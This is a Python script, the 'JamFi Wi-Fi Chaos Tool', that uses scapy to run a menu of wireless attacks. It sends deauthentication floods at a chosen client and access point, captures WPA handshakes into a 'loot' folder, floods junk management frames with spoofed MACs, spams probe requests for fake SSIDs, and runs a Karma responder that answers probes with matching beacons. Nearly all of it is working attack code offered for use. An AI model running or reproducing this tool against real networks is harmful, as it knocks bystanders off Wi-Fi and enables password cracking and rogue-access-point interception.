#!/usr/bin/env python3
import os
import sys
import time
import subprocess
from scapy.all import *
from threading import Thread
from random import choice, randint

seen_aps = {}
clients = {}

# Sample vendor MAC prefixes
vendor_prefixes = [
    "00:11:22", "00:0C:29", "D8:96:95", "F4:5C:89", "3C:5A:B4",
    "B8:27:EB", "8C:85:90", "40:B0:34", "A4:5E:60", "E0:3F:49"
]

# 🌸 JamFi Banner
def print_banner():
    print(r"""
     ██╗ █████╗ ███╗   ███╗        ███████╗██╗
     ██║██╔══██╗████╗ ████║        ██╔════╝██║
     ██║███████║██╔████╔██║        █████╗  ██║
██   ██║██╔══██║██║╚██╔╝██║        ██╔══╝  ██║
╚█████╔╝██║  ██║██║ ╚═╝ ██║███████╗██║     ██║
 ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝

         💜  JamFi Wi-Fi Chaos Tool  💜
      👩‍💻  Author: ekoms savior
      📡  Like Spam Jam — but wireless!
""")

# 📡 Channel Hopper
def channel_hopper(iface):
    while True:
        for ch in range(1, 14):
            os.system(f"iwconfig {iface} channel {ch}")
            time.sleep(0.5)

# 📶 Packet Handler for Client Scan
def packet_handler(pkt):
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr3
        ssid = pkt[Dot11Elt].info.decode(errors='ignore')
        if bssid not in seen_aps:
            seen_aps[bssid] = ssid
            print(f"📶 AP: {ssid:<25} BSSID: {bssid}")

    if pkt.haslayer(Dot11):
        if pkt.type == 2:
            src = pkt.addr2
            dst = pkt.addr1
            bssid = pkt.addr3
            if bssid in seen_aps and src != bssid:
                if src not in clients:
                    clients[src] = bssid
                    print(f"💡 Client: {src} -> AP: {seen_aps[bssid]}")

# 🔍 Client Scanner
def scan_clients():
    iface = input("💜 Enter monitor mode interface (e.g. wlan0mon): ").strip()
    if not iface:
        print("⚠️ Interface not entered.")
        return

    print("📡 Scanning for clients and APs...\n")
    Thread(target=channel_hopper, args=(iface,), daemon=True).start()
    sniff(iface=iface, prn=packet_handler, store=0)

# 💾 EAPOL Handshake Sniffer
def capture_handshake(iface, target_bssid):
    os.makedirs("loot", exist_ok=True)
    file_path = f"loot/handshake_{target_bssid.replace(':', '')}.pcap"
    print(f"📡 Sniffing for EAPOL handshakes to {target_bssid}... Saving to {file_path}")

    def eapol_filter(pkt):
        return pkt.haslayer(EAPOL) and pkt.haslayer(Dot11) and pkt.addr2 == target_bssid

    packets = sniff(iface=iface, lfilter=eapol_filter, timeout=30)
    if packets:
        wrpcap(file_path, packets)
        print(f"✅ Handshake captured and saved to {file_path} 💾")
    else:
        print("⚠️ No handshake captured.")

# 💥 Deauth Attack (with toggle for handshake capture)
def deauth_attack():
    iface = input("💜 Monitor mode interface (e.g. wlan0mon): ").strip()
    target = input("💜 Target Client MAC Address (STA): ").strip()
    ap = input("💜 Access Point MAC Address (BSSID): ").strip()
    try:
        count = int(input("💜 Number of deauth packets to send (e.g. 1000): "))
        interval = float(input("💜 Time between packets (e.g. 0.05): "))
    except ValueError:
        print("⚠️ Invalid count or interval.")
        return

    mode = input("💜 Capture handshake too? (1 = just deauth, 2 = deauth + handshake): ").strip()

    if mode == "2":
        t = Thread(target=capture_handshake, args=(iface, ap))
        t.start()
        time.sleep(2)

    dot11 = Dot11(addr1=target, addr2=ap, addr3=ap)
    frame = RadioTap()/dot11/Dot11Deauth(reason=7)
    print(f"\n🚀 Sending {count} deauth packets to {target} from {ap} via {iface}...\n")
    sendp(frame, iface=iface, count=count, inter=interval, verbose=1)
    print("✅ Deauth complete!\n")

# 🔥 Enhanced Junk Packet Flood
def junk_flood():
    iface = input("💜 Monitor mode interface (e.g. wlan0mon): ").strip()
    try:
        count = int(input("💜 Number of junk packets to send (e.g. 1000): "))
        interval = float(input("💜 Time between packets (e.g. 0.01): "))
    except ValueError:
        print("⚠️ Invalid input.")
        return

    print("💥 Sending enhanced junk 802.11 packets with randomized subtypes and vendor MACs...")

    subtype_choices = [0, 4, 5, 8]  # assoc_req, probe_req, probe_resp, beacon

    for _ in range(count):
        prefix = choice(vendor_prefixes)
        suffix = ":".join([f"%02x" % randint(0x00, 0xFF) for _ in range(3)])
        src_mac = f"{prefix}:{suffix}"
        dst_mac = RandMAC()
        subtype = choice(subtype_choices)

        pkt = RadioTap()/Dot11(type=0, subtype=subtype, addr1=dst_mac, addr2=src_mac, addr3=src_mac)/Raw(load=os.urandom(64))
        sendp(pkt, iface=iface, verbose=0)
        time.sleep(interval)

    print("✅ Junk flood complete! 💣")

# 📡 Probe Request Spammer
def probe_spammer():
    iface = input("💜 Monitor mode interface (e.g. wlan0mon): ").strip()
    try:
        count = int(input("💜 Number of probe requests to send (e.g. 1000): "))
        interval = float(input("💜 Time between packets (e.g. 0.01): "))
    except ValueError:
        print("⚠️ Invalid input.")
        return

    ssid_list = ["FreeWiFi", "HomeNetwork", "HackThePlanet", "Starbucks_Guest", "Xfinitywifi"]
    print("📡 Spamming probe requests with fake SSIDs...")

    for _ in range(count):
        ssid = choice(ssid_list)
        src_mac = RandMAC()
        pkt = RadioTap()/Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff", addr2=src_mac, addr3="ff:ff:ff:ff:ff:ff")/Dot11ProbeReq()/Dot11Elt(ID=0, info=ssid)
        sendp(pkt, iface=iface, verbose=0)
        time.sleep(interval)

    print("✅ Probe request spam complete! 📡")

# 🧲 Karma Responder (Passive)
def karma_responder():
    iface = input("💜 Monitor mode interface (e.g. wlan0mon): ").strip()
    print("🧲 Listening for probe requests and responding with matching beacons...")

    def respond(pkt):
        if pkt.haslayer(Dot11ProbeReq) and pkt.haslayer(Dot11Elt):
            ssid = pkt[Dot11Elt].info.decode(errors='ignore')
            if ssid:
                src_mac = RandMAC()
                beacon = RadioTap()/Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=src_mac, addr3=src_mac)/Dot11Beacon()/Dot11Elt(ID=0, info=ssid)/Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96")
                sendp(beacon, iface=iface, count=1, verbose=0)
                print(f"🧲 Responded to probe for SSID: {ssid}")

    sniff(iface=iface, prn=respond, store=0)

# 🏁 Menu
def main():
    print_banner()
    while True:
        print("\n🔹 1️⃣  Scan Connected Clients 🔍")
        print("🔹 2️⃣  Deauth Attack 💥")
        print("🔹 3️⃣  Junk Packet Flood 💣")
        print("🔹 4️⃣  Probe Request Spam 📡")
        print("🔹 5️⃣  Karma Responder 🧲")
        print("🔹 6️⃣  Quit ❌")
        choice = input("💜 Choose an option (1-6): ").strip()

        if choice == "1":
            scan_clients()
        elif choice == "2":
            deauth_attack()
        elif choice == "3":
            junk_flood()
        elif choice == "4":
            probe_spammer()
        elif choice == "5":
            karma_responder()
        elif choice == "6":
            print("👋 Goodbye, fren! Stay spicy! 💜")
            sys.exit()
        else:
            print("⚠️ Invalid choice. Try again!\n")

if __name__ == "__main__":
    main()
